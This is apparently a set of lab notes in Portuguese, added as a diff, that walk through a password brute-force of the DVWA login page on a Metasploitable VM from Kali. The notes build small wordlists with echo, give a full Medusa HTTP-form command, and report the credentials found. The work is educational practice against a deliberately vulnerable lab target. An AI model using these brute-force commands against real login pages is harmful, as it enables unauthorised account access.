@@ -1,0 +1,54 @@
+## SISTEMAS QUE SERÃO UTILIZADOS
+	-Metasploitable
+	-Kali-Linux
+com ambos dos sistemas abertos vamos acessar a pagina web
+	[192.168.56.101/dvwa/login.php]()
+	![[Pasted image 20251106232516.png]]
+Próximo passo é abrir a barra de desenvolvedor e acessar a aba network utilizando a tecla F12
+![[Pasted image 20251106232455.png]]
+## SITE DVWA
+O MESMO ENVIA PEDIDOS DE LOGIN PARA UM SISTEMA BACKEND, CASO LOGIN ESTA ERRADO SERA RETORNADO LOGIN FAILED
+
+## Criando Wordlist para medusa
+Iremos utilizar a mesma wordlist criada anteriormente:
+
+**UTILIZANDO ECHO**
+iremos utilizar o comando echo para criar arquivos txt tanto para usuarios, quanto para senhas
+
+**usuarios:**
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+user
+msfadmin
+admin
+root
+ira criar os usuários citados acima automaticamente, pois são o que esta no comando 
+
+**senhas:**
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+123456
+password
+qwerty
+msfadmin
+ira criar as senhas citados acima automaticamente, pois são o que esta no comando
+
+## Utilizando a medusa para combinar wordlists
+![[Pasted image 20251106234350.png]]
+	*medusa -h (informar o ip ou hostname do alvo)*
+	medusa -U (Arquivo que contem possíveis nomes de usuários)
+	medusa -P (Arquivo que contem possíveis senhas)
+	medusa -M (nome do modulo a ser executado .mod)
+	medusa -t (Total de tentativas de login para teste)
+	
+medusa -h  192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^%password=^PASS^&Login=Login'\
+-m 'FAIL=Login failed'-t 6
+
+![[Pasted image 20251107001510.png]]
+Senha encontrada em questão seria:
+login: admin
+senha: password
+![[Pasted image 20251107001602.png]]
+E ATRAVES DESSA SENHA CONSEGUIMOS ACESSAR O PAINEL DE CONTROLE DO SITE FORNECIDO
